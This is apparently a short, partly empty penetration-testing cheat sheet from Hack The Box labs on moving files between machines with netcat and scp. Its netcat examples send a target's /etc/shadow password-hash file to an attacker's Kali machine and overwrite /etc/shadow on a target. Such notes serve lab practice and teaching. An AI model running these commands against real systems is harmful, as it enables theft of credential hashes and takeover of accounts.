# 📁 Transfer files



## Linux

### netcat

**Scene 1**: When we have get files from other machine in our Kali

```bash
nc -nvlp 5555 < /etc/shadow     ( On target machine MS01/HTB + enter )
nc target_ip(HTB) 5555 > shadow
```

**Scene 2**: When we share file to other machine from our Kali

```bash
nc attack_ip(HTB) 5555 < shadow       ( it means whenever connection come share that file ) 
nc -nvlp 5555 > /etc/shadow           ( On target machine MS01/HTB + enter )
```





### FTP



### TFTP





### SCP

\# Copy a file:

```
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
```

\# Copy a directory:

```
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
```

***

## Windows
